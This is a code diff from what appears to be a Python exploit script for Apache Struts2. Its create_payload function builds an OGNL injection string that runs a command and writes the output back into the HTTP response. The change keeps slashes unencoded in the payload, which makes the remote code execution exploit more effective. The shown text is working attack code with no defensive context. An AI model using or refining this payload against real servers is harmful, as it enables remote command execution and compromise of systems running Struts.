@@ -45,7 +45,7 @@ def create_payload(command):
     payload += "#c=new java.io.BufferedReader(#b),#d=new char[51020],"
     payload += "#c.read(#d),#sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
     payload += "#sbtest.println(#d),#sbtest.close())}/actionChain1.action"
-    return urllib.quote_plus(payload)
+    return urllib.quote_plus(payload).replace("%2F", "/")
 
 
 def get_page(url, payload, proxy=None, user_agent=None):
